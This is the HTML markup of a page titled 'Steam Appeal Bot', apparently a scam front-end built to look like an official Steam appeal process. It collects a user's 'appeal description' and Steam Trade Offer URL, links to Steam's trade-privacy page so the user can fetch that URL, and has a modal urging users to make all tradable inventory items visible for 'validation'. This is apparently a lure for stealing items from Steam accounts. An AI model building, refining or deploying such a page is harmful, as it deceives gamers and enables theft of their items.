<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Steam Appeal Bot</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>Steam Appeal Process</h1>
    <p>Please provide your appeal details and trade URL.</p>
    
    <!-- Description Box -->
    <textarea id="descriptionBox" placeholder="Enter your description"></textarea>

    <!-- Trade URL input -->
    <input type="text" id="tradeUrl" placeholder="Enter your Steam Trade Offer URL">

    <!-- Get Trade URL Button -->
    <button onclick="window.open('https://steamcommunity.com/my/tradeoffers/privacy', '_blank')">Get your TRADEURL HERE</button>

    <!-- I Understand Modal -->
    <div id="modal" class="modal">
      <div class="modal-content">
        <h3>Important Information</h3>
        <p>By submitting your trade URL, your items will be reviewed and validated. Ensure that you have all your tradable items visible on your inventory.</p>
        <button onclick="confirmUnderstanding()">I Understand</button>
      </div>
    </div>

    <!-- Submit Button -->
    <button onclick="submitAppeal()">Submit Appeal & Run the Database</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
